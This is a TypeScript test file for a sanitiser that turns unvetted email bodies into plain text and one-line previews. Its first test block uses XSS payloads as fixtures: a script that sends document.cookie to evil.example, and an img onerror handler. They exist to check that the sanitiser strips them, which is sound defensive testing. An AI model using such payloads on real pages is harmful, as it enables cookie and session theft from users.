import { describe, expect, it } from "vitest";
import { looksLikeHtml, plainText, preview } from "@/domain/intake/body";

/**
 * The message view shows the body of an email nobody has vetted. Half of what
 * reaches contact@ is unsolicited — spam, blasts, cold approaches. So the one
 * property that actually matters here is that nothing executable survives.
 */
describe("no markup survives", () => {
  it("drops a script tag and everything inside it", () => {
    const body = "<p>Hello</p><script>fetch('https://evil.example/'+document.cookie)</script>";
    const out = plainText(body);
    expect(out).not.toContain("<script");
    expect(out).not.toContain("document.cookie");
    expect(out).toContain("Hello");
  });

  it("drops style blocks rather than pasting CSS into the message", () => {
    const out = plainText("<style>.a{color:red}</style><div>Bonjour</div>");
    expect(out).toBe("Bonjour");
  });

  it("leaves no angle-bracketed tag behind", () => {
    const out = plainText('<div class="x"><img src=x onerror=alert(1)><b>hi</b></div>');
    expect(out).not.toMatch(/<[^>]+>/);
    expect(out).not.toContain("onerror");
  });

  it("does not resurrect a tag by decoding entities", () => {
    // Decode first and strip second would turn this back into a live tag.
    const out = plainText("<p>&lt;script&gt;alert(1)&lt;/script&gt;</p>");
    expect(out).toBe("<script>alert(1)</script>");
    expect(looksLikeHtml(out)).toBe(true); // it is text, and stays text
  });
});

describe("plain text mail is left alone", () => {
  it("does not treat an email address in angle brackets as markup", () => {
    const body = "Please reply to Ahmed <ahmed@example.com> before Thursday.";
    expect(looksLikeHtml(body)).toBe(false);
    expect(plainText(body)).toBe(body);
  });

  it("keeps the line breaks somebody typed", () => {
    expect(plainText("Line one\nLine two")).toBe("Line one\nLine two");
  });
});

describe("structure worth keeping", () => {
  it("turns br and closing blocks into line breaks", () => {
    expect(plainText("<p>One</p><p>Two</p>")).toBe("One\nTwo");
    expect(plainText("<div>One<br>Two</div>")).toBe("One\nTwo");
  });

  it("marks list items so a list still reads as one", () => {
    expect(plainText("<ul><li>Pipe</li><li>Valve</li></ul>")).toBe("• Pipe\n• Valve");
  });

  it("collapses the whitespace that mail templates arrive full of", () => {
    const body = "<div>Bonjour   \n\n\n     Monsieur</div>";
    expect(plainText(body)).toBe("Bonjour Monsieur");
  });

  it("decodes the entities that would otherwise look broken", () => {
    expect(plainText("<p>Soci&eacute;t&eacute; &amp; Cie &mdash; 1&nbsp;000&euro;</p>")).toBe(
      "Société & Cie — 1 000€",
    );
  });
});

describe("preview", () => {
  it("returns the whole thing when it is already short", () => {
    expect(preview("<p>Devis demandé</p>")).toBe("Devis demandé");
  });

  it("cuts on a word boundary and marks the cut", () => {
    const out = preview(`<p>${"mot ".repeat(80)}</p>`, 40);
    expect(out.length).toBeLessThanOrEqual(41);
    expect(out.endsWith("…")).toBe(true);
    expect(out).not.toContain("mo…"); // not mid-word
  });

  it("is one line, whatever the body did", () => {
    expect(preview("<p>One</p><p>Two</p>")).toBe("One Two");
  });

  it("handles an empty body without complaining", () => {
    expect(preview(null)).toBe("");
    expect(plainText(null)).toBe("");
  });
});
